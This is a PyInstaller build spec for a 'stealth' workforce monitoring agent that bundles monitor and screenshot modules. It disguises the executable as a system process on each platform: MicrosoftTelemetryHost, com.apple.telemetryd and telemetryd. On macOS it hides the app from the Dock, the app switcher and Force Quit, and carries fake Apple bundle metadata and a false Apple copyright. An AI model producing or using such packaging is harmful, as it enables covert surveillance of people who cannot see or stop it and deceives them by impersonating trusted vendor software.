# -*- mode: python ; coding: utf-8 -*-
"""PyInstaller spec for stealth Workforce Analytics agent.

Builds a hidden background service with system-disguised process name:
  Windows  → MicrosoftTelemetryHost.exe
  macOS    → com.apple.telemetryd
  Linux    → telemetryd

No console, no tray icon, no visible UI. Runs as pure background monitoring.

Run from the `agent/packaging` directory:
    pyinstaller --noconfirm WorkforceAgent-Stealth.spec
"""

import sys
from pathlib import Path

SPEC_DIR = Path(SPECPATH)
AGENT_DIR = SPEC_DIR.parent
REPO_ROOT = AGENT_DIR.parent

is_win = sys.platform.startswith("win")
is_mac = sys.platform == "darwin"

# System-disguised process names
if is_win:
    EXE_NAME = "MicrosoftTelemetryHost"
elif is_mac:
    EXE_NAME = "com.apple.telemetryd"
    BUNDLE_NAME = "com.apple.telemetryd.app"
else:
    EXE_NAME = "telemetryd"

icon_path = None
if is_win:
    p = SPEC_DIR / "icons" / "icon.ico"
    icon_path = str(p) if p.exists() else None
elif is_mac:
    p = SPEC_DIR / "icons" / "icon.icns"
    icon_path = str(p) if p.exists() else None

datas = []
png = SPEC_DIR / "icons" / "icon.png"
if png.exists():
    datas.append((str(png), "agent_assets"))

hiddenimports = [
    "agent.api",
    "agent.config",
    "agent.identity",
    "agent.monitor",
    "agent.screenshot",
]

a = Analysis(
    [str(SPEC_DIR / "launcher-stealth.py")],
    pathex=[str(REPO_ROOT)],
    binaries=[],
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    runtime_hooks=[],
    excludes=["pystray"],  # No UI needed
    noarchive=False,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name=EXE_NAME,
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,
    runtime_tmpdir=None,
    console=False,
    icon=icon_path,
)

if is_mac:
    app = BUNDLE(
        exe,
        name=BUNDLE_NAME,
        icon=icon_path,
        bundle_identifier="com.apple.telemetryd",
        info_plist={
            # Hide from Dock, app switcher, and Force Quit dialog
            "LSUIElement": True,
            "LSBackgroundOnly": True,
            "NSUIElement": True,
            "LSSupressUserNotification": True,
            # Metadata disguise
            "CFBundleDisplayName": "Apple Telemetry Daemon",
            "CFBundleName": "com.apple.telemetryd",
            "CFBundleVersion": "1.0.0",
            "CFBundleShortVersionString": "1.0",
            "NSHumanReadableCopyright": "Copyright © Apple Inc.",
            "NSHighResolutionCapable": True,
        },
    )
